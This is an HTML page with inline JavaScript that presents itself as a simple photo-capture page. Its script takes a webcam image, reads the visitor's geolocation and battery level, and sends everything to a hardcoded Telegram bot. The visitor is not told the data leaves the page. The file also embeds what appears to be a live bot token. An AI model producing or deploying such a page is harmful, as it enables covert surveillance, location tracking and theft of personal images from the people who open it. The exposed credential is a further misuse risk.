<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture User Data</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        #camera {
            margin: 20px auto;
            width: 320px;
            height: 240px;
            border: 2px solid white;
        }
        #capture {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>Capture Your Photo</h1>
    <div id="camera">
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    </div>
    <button id="capture">Capture Photo</button>
    <p id="location"></p>
    <p id="battery"></p>

    <script>
        // Access the camera
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureButton = document.getElementById('capture');
        const locationInfo = document.getElementById('location');
        const batteryInfo = document.getElementById('battery');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
            })
            .catch((err) => {
                console.error("Error accessing the camera: ", err);
            });

        // Capture photo
        captureButton.addEventListener('click', () => {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 320, 240);
            const imageData = canvas.toDataURL('image/png');

            // Get location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    locationInfo.textContent = `Location: Latitude ${latitude}, Longitude ${longitude}`;

                    // Get battery status
                    navigator.getBattery().then((battery) => {
                        const batteryLevel = battery.level * 100;
                        batteryInfo.textContent = `Battery: ${batteryLevel}%`;

                        // Send data to Telegram bot
                        sendDataToTelegram(imageData, latitude, longitude, batteryLevel);
                    });
                });
            } else {
                locationInfo.textContent = "Geolocation is not supported by this browser.";
            }
        });

        function sendDataToTelegram(imageData, latitude, longitude, batteryLevel) {
            const botToken = '7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4';
            const chatId = '@BERLIN_IS_BERLIN';
            const message = `Location: Latitude ${latitude}, Longitude ${longitude}\nBattery: ${batteryLevel}%`;

            // Send image and message to Telegram bot
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', imageData);
            formData.append('caption', message);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
